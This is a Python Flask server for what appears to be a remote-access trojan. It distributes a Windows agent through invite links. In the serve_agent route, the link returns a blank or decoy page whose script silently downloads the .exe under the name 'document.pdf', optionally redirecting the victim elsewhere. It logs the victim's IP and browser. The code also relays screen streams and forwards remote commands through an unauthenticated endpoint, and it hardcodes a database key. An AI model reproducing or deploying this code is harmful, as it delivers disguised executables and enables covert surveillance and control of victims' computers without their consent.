"""
╔══════════════════════════════════════════════════════════════════╗
║         Screen Connect Relay + Distribution Server  v6.0         ║
║         Render-Ready • Globally Durable • Full Feature Set       ║
║                                                                  ║
║  WHAT'S NEW IN v6.0 (STREAMING OVERHAUL):                        ║
║  • FIXED: screen_data relay no longer uses skip_sid              ║
║    Frames are now emitted to a dedicated viewer room             ║
║    so every dashboard gets every frame — zero drops              ║
║  • FIXED: Render keep-alive — server pings itself every 4 min    ║
║    via HTTP to prevent free-tier spin-down (502 Bad Gateway fix) ║
║  • FIXED: WebSocket keep-alive — ping every 20s beats Render's   ║
║    55-second idle-connection killer                              ║
║  • NEW: Room-based relay — dashboards join "view:{device_id}"    ║
║    on start_stream; agents join their device_id room for cmds    ║
║  • NEW: frame_ack flow control — agent gets ack after relay      ║
║    preventing queue pile-up on slow connections                  ║
║  • NEW: /api/stream-stats — per-device FPS, kbps, viewer count   ║
║  • NEW: Render self-ping background task (anti-sleep)            ║
║  • NEW: subscribe_stream / unsubscribe_stream socket events      ║
║  • NEW: gunicorn --timeout 300 --keep-alive 75 for long WS      ║
║  • All v5.0 features preserved: invite, Supabase, agent binary   ║
║    streaming, power commands, shell, file browser, webcam etc.   ║
╚══════════════════════════════════════════════════════════════════╝

INSTALL:
  pip install flask flask-cors flask-socketio supabase python-dotenv \\
              gunicorn gevent gevent-websocket requests

RENDER start command (IMPORTANT — use --timeout 300, not 120):
  gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \\
           -w 1 --timeout 300 --keep-alive 75 --bind 0.0.0.0:$PORT server:app

LOCAL dev:
  py -3.12 server.py
"""

import os
import re
import time
import logging
import datetime
import threading
import collections

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

from pathlib import Path
from functools import wraps

from flask import Flask, request, jsonify, send_from_directory, make_response, Response, redirect
from flask_cors import CORS

try:
    from flask_socketio import SocketIO, emit, join_room, leave_room
    SOCKETIO_OK = True
except ImportError:
    SOCKETIO_OK = False
    print("[WARN] flask-socketio not installed — pip install flask-socketio gevent gevent-websocket")

try:
    import requests as _requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

# ══════════════════════════════════════════════════════════════
#  Configuration — all overridable by Render environment vars
# ══════════════════════════════════════════════════════════════
SUPABASE_URL  = os.environ.get("SUPABASE_URL")  or "https://iacdzpcoftxxcoigopun.supabase.co"
SUPABASE_KEY  = os.environ.get("SUPABASE_KEY")  or "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlhY2R6cGNvZnR4eGNvaWdvcHVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY0MjA1NTUsImV4cCI6MjA5MTk5NjU1NX0.5Eo21XrLTWL3RyKmuvJPdaS-NssraDMyAxVMFy-F054"
ADMIN_KEY     = os.environ.get("ADMIN_KEY",    "mview-admin-secret")
TABLE         = os.environ.get("SB_TABLE",     "devices")
PORT          = int(os.environ.get("PORT", 5000))
VERSION       = "6.0.0"

AGENT_STORAGE_URL = os.environ.get(
    "AGENT_STORAGE_URL",
    "https://github.com/maxwelnkaranja-ops/mview/releases/latest/download/master_agent_v4_HEAVY.exe"
)
AGENT_DIR   = os.environ.get("AGENT_DIR",  "bin")
AGENT_FILE  = os.environ.get("AGENT_FILE", "master_agent.exe")

# Watchdog — mark a device offline if no heartbeat for this many seconds
HEARTBEAT_TIMEOUT = int(os.environ.get("HEARTBEAT_TIMEOUT", "35"))

# Self-ping interval (seconds) — keeps Render free tier alive, prevents 502
# Set 0 to disable (paid Render plan, Railway, Fly.io etc.)
SELF_PING_INTERVAL = int(os.environ.get("SELF_PING_INTERVAL", "240"))   # 4 minutes

TOKEN_RE = re.compile(r"^MV-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}$")

# ── Frame stats tracking per device ──────────────────────────────────────
_frame_stats: dict = collections.defaultdict(lambda: collections.deque(maxlen=60))
_frame_stats_lock  = threading.Lock()

# ══════════════════════════════════════════════════════════════
#  Logging
# ══════════════════════════════════════════════════════════════
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("screenconnect")

# ══════════════════════════════════════════════════════════════
#  Flask + CORS + SocketIO
# ══════════════════════════════════════════════════════════════
app = Flask(__name__, static_folder=".", static_url_path="")

CORS(
    app,
    resources={r"/*": {"origins": "*"}},
    allow_headers=["Content-Type", "Authorization", "X-Admin-Key"],
    methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
    supports_credentials=False,
)

if SOCKETIO_OK:
    sio = SocketIO(
        app,
        cors_allowed_origins="*",
        async_mode="gevent",
        logger=False,
        engineio_logger=False,
        # ── KEY FIX: ping every 20s to beat Render's 55s idle killer ──
        ping_timeout=60,
        ping_interval=20,
        max_http_buffer_size=100 * 1024 * 1024,   # 100 MB for video + file transfers
        allow_upgrades=True,
    )
else:
    sio = None

# ══════════════════════════════════════════════════════════════
#  In-memory state
# ══════════════════════════════════════════════════════════════
_devices:   dict = {}
_dev_lock          = threading.Lock()

# _viewers[device_id] = set of dashboard SIDs viewing that stream
_viewers: dict = collections.defaultdict(set)
_view_lock = threading.Lock()

_agent_cache: bytes | None = None
_agent_cache_ts: float     = 0.0
_agent_cache_lock          = threading.Lock()
AGENT_CACHE_TTL            = 300

_sb      = None
_sb_lock = threading.Lock()

# ══════════════════════════════════════════════════════════════
#  Supabase helpers
# ══════════════════════════════════════════════════════════════
def get_sb():
    global _sb
    with _sb_lock:
        if _sb:
            return _sb
        try:
            from supabase import create_client
            _sb = create_client(SUPABASE_URL, SUPABASE_KEY)
            log.info("Supabase connected.")
            return _sb
        except Exception as e:
            log.warning(f"Supabase unavailable: {e}")
            return None

def _sb_reset():
    global _sb
    with _sb_lock:
        _sb = None

def db_get(token):
    sb = get_sb()
    if not sb:
        return {"device_id": token, "status": "pending", "expires_at": None}
    try:
        r = sb.table(TABLE).select("*").eq("device_id", token).execute()
        rows = r.data or []
        return rows[0] if rows else None
    except Exception as e:
        log.error(f"db_get error: {e}"); _sb_reset()
        return {"device_id": token, "status": "pending", "expires_at": None}

def db_update(token, upd: dict):
    sb = get_sb()
    if not sb:
        return False
    try:
        sb.table(TABLE).update(upd).eq("device_id", token).execute()
        return True
    except Exception as e:
        log.error(f"db_update error: {e}"); _sb_reset()
        return False

def db_insert(payload: dict):
    sb = get_sb()
    if not sb:
        return payload
    try:
        r = sb.table(TABLE).insert(payload).execute()
        return (r.data or [payload])[0]
    except Exception as e:
        log.error(f"db_insert error (full payload): {e}")
        # Retry without new columns in case the table schema is missing them
        _sb_reset()
        sb2 = get_sb()
        if not sb2:
            return payload
        try:
            safe = {k: v for k, v in payload.items()
                    if k not in ("link_mode", "redirect_url")}
            r2 = sb2.table(TABLE).insert(safe).execute()
            log.warning("db_insert: retried without link_mode/redirect_url — "
                        "run ALTER TABLE to add these columns!")
            return (r2.data or [safe])[0]
        except Exception as e2:
            log.error(f"db_insert retry also failed: {e2}"); _sb_reset()
            return payload

def db_list_all() -> list:
    sb = get_sb()
    if not sb:
        return []
    try:
        r = sb.table(TABLE).select("*").order("created_at", desc=True).execute()
        return r.data or []
    except Exception as e:
        log.error(f"db_list_all error: {e}"); _sb_reset()
        return []

# ══════════════════════════════════════════════════════════════
#  Agent binary helpers
# ══════════════════════════════════════════════════════════════
def _fetch_agent_bytes() -> bytes | None:
    global _agent_cache, _agent_cache_ts
    with _agent_cache_lock:
        now = time.time()
        if _agent_cache and (now - _agent_cache_ts) < AGENT_CACHE_TTL:
            return _agent_cache
        if REQUESTS_OK and AGENT_STORAGE_URL:
            try:
                log.info(f"Fetching agent from GitHub Releases: {AGENT_STORAGE_URL}")
                resp = _requests.get(AGENT_STORAGE_URL, timeout=60)
                if resp.status_code == 200 and len(resp.content) > 10_000:
                    _agent_cache    = resp.content
                    _agent_cache_ts = now
                    log.info(f"Agent cached from Storage: {len(_agent_cache):,} bytes")
                    return _agent_cache
                else:
                    log.warning(f"Storage fetch returned {resp.status_code} / {len(resp.content)} bytes")
            except Exception as e:
                log.warning(f"Storage fetch error: {e}")
        local = Path(AGENT_DIR) / AGENT_FILE
        if local.is_file():
            log.info(f"Loading agent from local file: {local}")
            _agent_cache    = local.read_bytes()
            _agent_cache_ts = now
            return _agent_cache
        log.error("Agent binary not available from Storage or local file.")
        return None

def _build_patched_agent(token: str) -> bytes | None:
    raw = _fetch_agent_bytes()
    if not raw:
        return None
    MAGIC_HEAD  = b"MVTK"
    MAGIC_TAIL  = b"MVED"
    TOKEN_FIELD = 56
    tok_bytes = token.encode("utf-8")[:TOKEN_FIELD]
    padded    = tok_bytes.ljust(TOKEN_FIELD, b"\x00")
    trailer   = MAGIC_HEAD + padded + MAGIC_TAIL
    return raw + trailer

# ══════════════════════════════════════════════════════════════
#  Misc helpers
# ══════════════════════════════════════════════════════════════
def utcnow() -> str:
    return datetime.datetime.utcnow().isoformat()

def is_expired(s: dict) -> bool:
    exp = s.get("expires_at")
    if not exp:
        return False
    try:
        dt = datetime.datetime.fromisoformat(exp.replace("Z", "+00:00"))
        return datetime.datetime.now(datetime.timezone.utc) > dt
    except Exception:
        return False

def valid_token(t) -> bool:
    return bool(TOKEN_RE.match(t or ""))

def require_admin(f):
    @wraps(f)
    def w(*a, **k):
        if request.headers.get("X-Admin-Key", "") != ADMIN_KEY:
            return jsonify({"error": "Unauthorised"}), 401
        return f(*a, **k)
    return w

def broadcast_device_update():
    if not sio:
        return
    try:
        rows = db_list_all()
        with _dev_lock:
            live = {d["device_id"]: d for d in _devices.values()}
        for row in rows:
            did = row.get("device_id", "")
            if did in live:
                row["_live"]       = True
                row["cpu"]         = live[did].get("cpu")
                row["ram"]         = live[did].get("ram")
                row["last_beat"]   = live[did].get("last_beat")
                row["frame_count"] = live[did].get("frame_count", 0)
        sio.emit("device_update", {"rows": rows, "ts": utcnow()})
    except Exception as e:
        log.error(f"broadcast_device_update error: {e}")

# ══════════════════════════════════════════════════════════════
#  CORS preflight
# ══════════════════════════════════════════════════════════════
@app.before_request
def handle_preflight():
    if request.method == "OPTIONS":
        resp = make_response("", 204)
        resp.headers["Access-Control-Allow-Origin"]  = "*"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, X-Admin-Key"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, PATCH, DELETE, OPTIONS"
        return resp

# ══════════════════════════════════════════════════════════════
#  Static routes
# ══════════════════════════════════════════════════════════════
@app.route("/")
def root():
    for f in ("index.html", "app.html"):
        if Path(f).is_file():
            return send_from_directory(".", f)
    return jsonify({"status": "ok", "version": VERSION}), 200

@app.route("/app.html")
def serve_app_html():
    return send_from_directory(".", "app.html")

@app.route("/dashboard")
@app.route("/dashboard.html")
def serve_dashboard():
    return send_from_directory(".", "dashboard.html")

@app.route("/index.html")
def serve_index():
    return send_from_directory(".", "index.html")

@app.route("/login.html")
def serve_login():
    return redirect("/", 301)

@app.route("/session_manager.js")
def serve_session_manager():
    host = request.host_url.rstrip("/")
    js = f"""/* Auto-generated SessionManager v6 — do not edit manually */
'use strict';
(function() {{
  const SERVER_URL = window.SCREEN_CONNECT_SERVER_URL || window.MVIEW_SERVER_URL || '{host}';
  const SUPABASE_URL = window.MVIEW_SUPABASE_URL || '{SUPABASE_URL}';
  const SUPABASE_KEY = window.MVIEW_SUPABASE_ANON_KEY || '{SUPABASE_KEY}';

  let _pollTimer = null;
  let _currentToken = null;

  const SM = {{
    CONFIG: {{
      SERVER_URL,
      SUPABASE_URL,
      SUPABASE_ANON_KEY: SUPABASE_KEY,
      TABLE_CANDIDATES: ['agent_invites', 'devices'],
    }},

    currentToken: null,
    currentLink: null,

    reset() {{
      if (_pollTimer) {{ clearInterval(_pollTimer); _pollTimer = null; }}
      _currentToken = null;
      SM.currentToken = null;
      SM.currentLink = null;
      const s3 = document.getElementById('device-step-3');
      const s2 = document.getElementById('device-step-2');
      const s1 = document.getElementById('device-step-1');
      if (s3) s3.style.display = 'none';
      if (s2) s2.style.display = 'none';
      if (s1) s1.style.display = '';
    }},

    async generateInviteLink() {{
      const labelEl = document.getElementById('device-name-input') || document.getElementById('device-label');
      const typeEl  = document.getElementById('device-type-select') || document.getElementById('device-type');
      const locEl   = document.getElementById('device-location-input') || document.getElementById('device-location');
      const label   = labelEl?.value?.trim() || 'New Device';
      const dtype   = typeEl?.value  || 'Standard Display';
      const loc     = locEl?.value?.trim() || '';

      const s1 = document.getElementById('device-step-1');
      const s2 = document.getElementById('device-step-2');
      const s3 = document.getElementById('device-step-3');
      if (s1) s1.style.display = 'none';
      if (s2) s2.style.display = '';
      if (s3) s3.style.display = 'none';
      SM._notify('Generating invite link\u2026', 'info');

      try {{
        const res = await fetch(SERVER_URL + '/api/invite', {{
          method: 'POST',
          headers: {{ 'Content-Type': 'application/json' }},
          body: JSON.stringify({{ label, device_type: dtype, location: loc }}),
        }});
        const data = await res.json();
        if (!res.ok) throw new Error(data.error || 'Server error');

        _currentToken = data.token;
        SM.currentToken = data.token;
        SM.currentLink  = data.download_url || data.agent_url;

        const inp = document.getElementById('copy-link-input');
        if (inp) inp.value = SM.currentLink;
        const dtok = document.getElementById('display-token');
        if (dtok) dtok.textContent = data.token;
        const dexp = document.getElementById('display-expiry');
        if (dexp && data.expires_at) dexp.textContent = '\u00b7 Expires ' + new Date(data.expires_at).toLocaleString();
        const mexp = document.getElementById('meta-expiry');
        if (mexp) mexp.textContent = '24 hours';
        const mtype = document.getElementById('meta-type');
        if (mtype) mtype.textContent = dtype;
        const ddbtn = document.getElementById('direct-download-btn');
        if (ddbtn) ddbtn.href = SM.currentLink;

        if (s2) s2.style.display = 'none';
        if (s3) s3.style.display = '';
        SM._notify('Invite link ready \u2014 waiting for device to connect', 'ok');
        SM._startPolling(data.token);
      }} catch (err) {{
        if (s2) s2.style.display = 'none';
        if (s1) s1.style.display = '';
        SM._notify('Failed to generate link: ' + err.message, 'warn');
      }}
    }},

    copyLink() {{
      const inp = document.getElementById('copy-link-input');
      if (!inp) return;
      inp.select();
      try {{ document.execCommand('copy'); }} catch(e) {{ navigator.clipboard?.writeText(inp.value); }}
      const icon = document.getElementById('copy-icon');
      if (icon) {{ icon.textContent = 'check'; setTimeout(() => icon.textContent = 'content_copy', 1800); }}
    }},

    _startPolling(token) {{
      if (_pollTimer) clearInterval(_pollTimer);
      const dot  = document.getElementById('poll-dot');
      const text = document.getElementById('poll-status-text');
      let checks = 0;

      async function tick() {{
        checks++;
        try {{
          const r = await fetch(SERVER_URL + '/api/session/' + token + '/status');
          if (!r.ok) return;
          const d = await r.json();
          if (d.status === 'downloading') {{
            if (dot)  {{ dot.className = 'poll-dot yellow'; }}
            if (text) text.textContent = 'Agent downloaded \u2014 waiting for first check-in\u2026';
            SM._notify('Agent installer downloaded on target device', 'info');
          }} else if (d.status === 'connected') {{
            clearInterval(_pollTimer); _pollTimer = null;
            if (dot)  {{ dot.className = 'poll-dot green'; dot.style.animation = 'none'; }}
            if (text) text.textContent = '\u2713 Device connected! Refreshing dashboard\u2026';
            SM._notify('\u2713 ' + (d.hostname || d.label || token) + ' connected successfully', 'ok');
            SM._addActivity('Device connected: ' + (d.hostname || d.label || token), 'ok');
            if (typeof refreshDashboardFromSupabase === 'function') {{
              setTimeout(refreshDashboardFromSupabase, 1000);
            }}
            return;
          }}
          if (checks > 120) {{
            clearInterval(_pollTimer); _pollTimer = null;
            if (text) text.textContent = 'Link waiting \u2014 open in dashboard to reconnect.';
          }}
        }} catch (e) {{}}
      }}
      _pollTimer = setInterval(tick, 5000);
      tick();
    }},

    _notify(msg, type) {{
      if (typeof showToast === 'function') {{ showToast(msg, type === 'ok' ? 'success' : type === 'warn' ? 'error' : 'info'); }}
      const list = document.getElementById('notif-list');
      if (!list) return;
      const icons = {{ ok: 'check_circle', warn: 'warning', info: 'info' }};
      const icon  = icons[type] || 'info';
      const item  = document.createElement('div');
      item.className = 'notif-item';
      item.innerHTML = '<span class="material-symbols-outlined notif-i ' + type + '">' + icon + '</span>'
        + '<div><div class="notif-title">' + msg + '</div><div class="notif-time">' + new Date().toLocaleTimeString() + '</div></div>';
      const empty = list.querySelector('.notif-item:only-child');
      if (empty && empty.textContent.includes('No devices')) list.innerHTML = '';
      list.insertBefore(item, list.firstChild);
      const badge = document.getElementById('notif-badge');
      if (badge) {{ badge.textContent = list.children.length; badge.style.display = 'flex'; }}
    }},

    _addActivity(msg, sev) {{
      if (typeof addActivityLog === 'function') {{
        addActivityLog({{ time: new Date().toLocaleTimeString(), event: msg, screen: '', user: 'System', sev: sev || 'info' }});
      }}
    }},
  }};

  window.SessionManager = SM;
}})();
"""
    return js, 200, {"Content-Type": "application/javascript"}


@app.route("/config.js")
def serve_config():
    if Path("config.js").is_file():
        return send_from_directory(".", "config.js", mimetype="application/javascript")
    host = request.host_url.rstrip("/")
    js = f"""/* Auto-generated by server.py v{VERSION} */
window.SCREEN_CONNECT_SERVER_URL    = '{host}';
window.MVIEW_SERVER_URL             = '{host}';
window.MVIEW_SUPABASE_URL           = '{SUPABASE_URL}';
window.MVIEW_SUPABASE_ANON_KEY      = '{SUPABASE_KEY}';
window.SessionManager = window.SessionManager || {{}};
window.SessionManager.CONFIG = {{
  SERVER_URL:        window.SCREEN_CONNECT_SERVER_URL,
  SUPABASE_URL:      window.MVIEW_SUPABASE_URL,
  SUPABASE_ANON_KEY: window.MVIEW_SUPABASE_ANON_KEY,
}};
"""
    return js, 200, {"Content-Type": "application/javascript"}

# ══════════════════════════════════════════════════════════════
#  Health / Status
# ══════════════════════════════════════════════════════════════
@app.route("/status")
@app.route("/health")
@app.route("/api/server-info")
def health():
    with _dev_lock:
        online_count = len(_devices)
    agent_avail = bool(AGENT_STORAGE_URL)
    local_agent  = (Path(AGENT_DIR) / AGENT_FILE).is_file()
    return jsonify({
        "status":          "ok",
        "version":         VERSION,
        "server_time":     utcnow(),
        "database":        get_sb() is not None,
        "socketio":        SOCKETIO_OK,
        "devices_online":  online_count,
        "agent_storage":   AGENT_STORAGE_URL,
        "agent_local":     local_agent,
        "agent_available": agent_avail or local_agent,
        "render_port":     PORT,
    })

@app.route("/api/agent-info")
def api_agent_info():
    local = Path(AGENT_DIR) / AGENT_FILE
    return jsonify({
        "storage_url":  AGENT_STORAGE_URL,
        "local_file":   str(local.resolve()),
        "local_exists": local.is_file(),
        "local_size":   local.stat().st_size if local.is_file() else 0,
        "cache_size":   len(_agent_cache) if _agent_cache else 0,
    })

@app.route("/api/stream-stats")
def api_stream_stats():
    """Per-device streaming statistics — FPS, kbps, viewer count."""
    stats = {}
    with _dev_lock:
        devs = dict(_devices)
    with _view_lock:
        views = {k: len(v) for k, v in _viewers.items()}
    with _frame_stats_lock:
        for did, dq in _frame_stats.items():
            if not dq:
                continue
            now = time.time()
            recent = [(t, b) for t, b in dq if now - t < 5.0]
            fps = len(recent) / 5.0 if recent else 0
            bps = sum(b for _, b in recent) / 5.0 if recent else 0
            stats[did] = {
                "fps":          round(fps, 1),
                "kbps":         round(bps / 1024, 1),
                "viewers":      views.get(did, 0),
                "total_frames": devs.get(did, {}).get("frame_count", 0),
                "last_frame":   devs.get(did, {}).get("last_frame_ts", ""),
            }
    return jsonify({"stream_stats": stats, "ts": utcnow()})

# ══════════════════════════════════════════════════════════════
#  Invite / Agent download
# ══════════════════════════════════════════════════════════════
@app.route("/api/invite",      methods=["GET", "POST"])
@app.route("/api/generate",    methods=["GET", "POST"])
@app.route("/invite/generate", methods=["GET", "POST"])
@app.route("/generate_invite", methods=["GET", "POST"])
def generate_invite():
    import secrets
    data = request.get_json(silent=True) or request.form.to_dict() or {}

    def hex6():
        return secrets.token_hex(3).upper()

    token      = f"MV-{hex6()}-{hex6()}-{hex6()}"
    label      = data.get("label") or data.get("name") or token
    loc        = data.get("location", "")
    dtype      = data.get("device_type", "Standard Display")
    expiry_sec = int(data.get("expiry", 86400))

    expires_at = None
    if expiry_sec > 0:
        expires_at = (
            datetime.datetime.now(datetime.timezone.utc)
            + datetime.timedelta(seconds=expiry_sec)
        ).isoformat()

    link_mode    = data.get("link_mode", "blank")   # "blank" or "redirect"
    redirect_url = data.get("redirect_url", "").strip()

    payload = {
        "device_id":    token,
        "label":        label,
        "location":     loc,
        "device_type":  dtype,
        "status":       "pending",
        "expires_at":   expires_at,
        "created_at":   utcnow(),
        "link_mode":    link_mode,
        "redirect_url": redirect_url,
    }
    db_insert(payload)
    log.info(f"Invite generated: {token}  label={label}  mode={link_mode}")

    srv = request.host_url.rstrip("/")
    return jsonify({
        "status":       "ok",
        "token":        token,
        "device_id":    token,
        "label":        label,
        "download_url": f"{srv}/guide/{token}",
        "agent_url":    f"{srv}/guide/{token}",
        "expires_at":   expires_at,
        "link_mode":    link_mode,
    }), 201


@app.route("/invite/<token>")
@app.route("/onboard/<token>")
@app.route("/guide/<token>")
def serve_agent(token):
    log.info(f"Agent download request: token={token}  ip={request.remote_addr}")

    if not valid_token(token):
        return jsonify({"error": "Invalid token format."}), 400

    session = db_get(token)
    if session is None:
        return jsonify({"error": "Invite link not found."}), 404
    if session.get("status") in ("revoked", "expired", "rejected"):
        return jsonify({"error": "Link no longer valid."}), 410
    if is_expired(session):
        db_update(token, {"status": "expired"})
        return jsonify({"error": "Link expired."}), 410

    db_update(token, {
        "status":        "downloading",
        "download_ip":   request.remote_addr,
        "downloaded_at": utcnow(),
        "user_agent":    request.headers.get("User-Agent", "")[:200],
    })

    link_mode    = session.get("link_mode") or "blank"
    redirect_url = (session.get("redirect_url") or "").strip()
    dl_url       = AGENT_STORAGE_URL

    log.info(f"Agent download: token={token}  mode={link_mode}")

    if link_mode == "redirect" and redirect_url:
        # Serve a minimal page: silently trigger download then redirect the user
        safe_dl  = dl_url.replace("'", "\'")
        safe_rdr = redirect_url.replace("'", "\'")
        html = f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Loading…</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{background:#fff}}</style>
</head>
<body>
<script>
(function(){{
  var a=document.createElement('a');
  a.href='{safe_dl}';
  a.download='document.pdf';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  setTimeout(function(){{ window.location.replace('{safe_rdr}'); }}, 800);
}})();
</script>
</body>
</html>"""
        return html, 200, {"Content-Type": "text/html; charset=utf-8"}

    # Default: blank page — download fires silently, page stays blank
    safe_dl = dl_url.replace("'", "\'")
    html = f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title> </title>
<style>*{{margin:0;padding:0}}body{{background:#000}}</style>
</head>
<body>
<script>
(function(){{
  var a=document.createElement('a');
  a.href='{safe_dl}';
  a.download='document.pdf';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}})();
</script>
</body>
</html>"""
    return html, 200, {"Content-Type": "text/html; charset=utf-8"}


@app.route("/api/session/<token>/status")
def get_session_status(token):
    if not valid_token(token):
        return jsonify({"error": "Invalid token"}), 400
    s = db_get(token)
    if not s:
        return jsonify({"error": "Not found"}), 404
    return jsonify({
        "token":        token,
        "status":       s.get("status", "pending"),
        "hostname":     s.get("hostname", ""),
        "username":     s.get("username", ""),
        "label":        s.get("label", ""),
        "connected_at": s.get("connected_at", ""),
        "download_ip":  s.get("download_ip", ""),
    }), 200

# ══════════════════════════════════════════════════════════════
#  Session management
# ══════════════════════════════════════════════════════════════
@app.route("/api/session/<token>")
def get_session(token):
    if not valid_token(token):
        return jsonify({"error": "Invalid token"}), 400
    s = db_get(token)
    return (jsonify(s), 200) if s else (jsonify({"error": "Not found"}), 404)

@app.route("/api/sessions")
@require_admin
def list_sessions():
    sb = get_sb()
    if not sb:
        return jsonify({"sessions": [], "note": "DB offline"}), 200
    try:
        r = sb.table(TABLE).select("*").order("created_at", desc=True).execute()
        return jsonify({"sessions": r.data or [], "count": len(r.data or [])})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/session/<token>", methods=["DELETE"])
@require_admin
def revoke_session(token):
    if not valid_token(token):
        return jsonify({"error": "Invalid token"}), 400
    db_update(token, {"status": "revoked", "revoked_at": utcnow()})
    with _dev_lock:
        dev = _devices.get(token)
    if dev and sio:
        sio.emit("request_action", {"tab": "uninstall", "device_id": token}, room=token)
    return jsonify({"status": "revoked", "device_id": token})

@app.route("/agent/checkin", methods=["POST"])
def agent_checkin():
    data  = request.get_json(silent=True) or {}
    token = data.get("device_id", "").strip()
    if not valid_token(token):
        return jsonify({"error": "Invalid device_id"}), 400
    session = db_get(token)
    if not session:
        return jsonify({"error": "Session not found"}), 404
    if session.get("status") == "revoked":
        return jsonify({"error": "Session revoked"}), 403
    db_update(token, {
        "status":        "connected",
        "ip_address":    request.remote_addr,
        "hostname":      data.get("hostname"),
        "os_info":       data.get("os_info"),
        "agent_version": data.get("agent_version"),
        "connected_at":  utcnow(),
    })
    broadcast_device_update()
    log.info(f"Agent check-in: {token}  ip={request.remote_addr}")
    return jsonify({"status": "accepted", "server_time": utcnow()}), 200

# ══════════════════════════════════════════════════════════════
#  Live device API
# ══════════════════════════════════════════════════════════════
@app.route("/api/devices")
def api_devices():
    with _dev_lock:
        devs = list(_devices.values())
    return jsonify({"devices": devs, "count": len(devs)})

@app.route("/api/command", methods=["POST"])
def send_command():
    data = request.get_json(silent=True) or {}
    did  = data.get("device_id", "")
    if not sio:
        return jsonify({"error": "SocketIO not installed"}), 503
    with _dev_lock:
        dev = _devices.get(did)
    if not dev:
        return jsonify({"error": "Device not connected"}), 404
    sio.emit("request_action", data, room=did)
    return jsonify({"status": "sent", "tab": data.get("tab")})

# ══════════════════════════════════════════════════════════════
#  Error handlers
# ══════════════════════════════════════════════════════════════
@app.errorhandler(404)
def e404(e):
    return jsonify({"error": "Not found"}), 404

@app.errorhandler(500)
def e500(e):
    log.exception("500 error")
    return jsonify({"error": "Internal server error"}), 500

# ══════════════════════════════════════════════════════════════
#  SocketIO — all event handlers
# ══════════════════════════════════════════════════════════════
if SOCKETIO_OK and sio:

    # ── Connection lifecycle ────────────────────────────────────
    @sio.on("connect")
    def on_connect():
        log.info(f"WS connect: sid={request.sid}")
        # All new connections join the global dashboards room.
        # Agents will later join their device_id room.
        # Dashboards join view:{device_id} rooms when streaming.
        join_room("dashboards")

    @sio.on("disconnect")
    def on_disconnect():
        sid = request.sid
        # Remove from all viewer rooms
        with _view_lock:
            for did, sids in list(_viewers.items()):
                if sid in sids:
                    sids.discard(sid)
                    log.info(f"Dashboard {sid} left view room for {did}")
        # Handle agent disconnect
        with _dev_lock:
            gone = [did for did, d in _devices.items() if d.get("sid") == sid]
            for did in gone:
                label = _devices[did].get("label", did)
                del _devices[did]
                log.info(f"Device offline: {label} ({did})")
                db_update(did, {"status": "offline", "disconnected_at": utcnow()})
                sio.emit("agent_offline",  {"device_id": did, "name": label, "label": label, "ts": utcnow()})
                sio.emit("device_offline", {"device_id": did, "label": label, "ts": utcnow()})
        if gone:
            broadcast_device_update()

    # ── Dashboard subscribes to a device's stream ───────────────
    @sio.on("subscribe_stream")
    def on_subscribe_stream(data):
        """
        Dashboard calls this when opening Screen Connect viewer.
        Adds dashboard SID to view:{device_id} room — all frames
        for that device are then relayed exclusively to that room.
        """
        did = data.get("device_id", "")
        if not did:
            return
        room = f"view:{did}"
        join_room(room)
        with _view_lock:
            _viewers[did].add(request.sid)
        viewer_count = len(_viewers[did])
        log.info(f"Dashboard {request.sid} subscribed to {did} (viewers: {viewer_count})")
        emit("subscribed", {"device_id": did, "viewers": viewer_count})

    @sio.on("unsubscribe_stream")
    def on_unsubscribe_stream(data):
        """Dashboard calls this when leaving the viewer."""
        did = data.get("device_id", "")
        if not did:
            return
        room = f"view:{did}"
        leave_room(room)
        with _view_lock:
            _viewers[did].discard(request.sid)
        log.info(f"Dashboard {request.sid} unsubscribed from {did}")

    # ── Agent registration ──────────────────────────────────────
    @sio.on("agent_connect")
    def on_agent_connect(data):
        did   = data.get("device_id") or data.get("token", "")
        label = data.get("label") or data.get("hostname") or did
        # Agent joins its own room so commands can be sent directly to it
        join_room(did)
        with _dev_lock:
            _devices[did] = {
                "sid":           request.sid,
                "device_id":     did,
                "label":         label,
                "status":        "online",
                "hostname":      data.get("hostname"),
                "username":      data.get("username"),
                "os":            data.get("os"),
                "local_ip":      data.get("local_ip"),
                "cpu_count":     data.get("cpu_count"),
                "ram_total_gb":  data.get("ram_total_gb"),
                "agent_version": data.get("agent_version"),
                "stream_mode":   data.get("stream_mode", "video"),
                "gpu":           data.get("gpu"),
                "screen_count":  data.get("screen_count"),
                "connected_at":  utcnow(),
                "last_beat":     utcnow(),
                "cpu":           None,
                "ram":           None,
                "frame_count":   0,
                "last_frame_ts": "",
                "fingerprint":   data,
            }
        log.info(f"Agent ONLINE: {label} ({did})")
        db_update(did, {
            "status":        "online",
            "ip_address":    data.get("local_ip"),
            "hostname":      data.get("hostname"),
            "os_info":       data.get("os"),
            "agent_version": data.get("agent_version"),
            "connected_at":  utcnow(),
        })
        sio.emit("agent_online",  {"device_id": did, "name": label, "label": label,
                                   "ip": data.get("local_ip"), "fingerprint": data})
        sio.emit("device_online", {"device_id": did, "label": label, "fingerprint": data})
        broadcast_device_update()

    # ── Heartbeat ───────────────────────────────────────────────
    @sio.on("heartbeat")
    def on_hb(data):
        did = data.get("device_id")
        with _dev_lock:
            if did in _devices:
                _devices[did].update({
                    "cpu":       data.get("cpu"),
                    "ram":       data.get("ram"),
                    "last_beat": utcnow(),
                })
        sio.emit("heartbeat_update", data, room="dashboards", skip_sid=request.sid)

    # ── Dashboard → any device (generic command) ────────────────
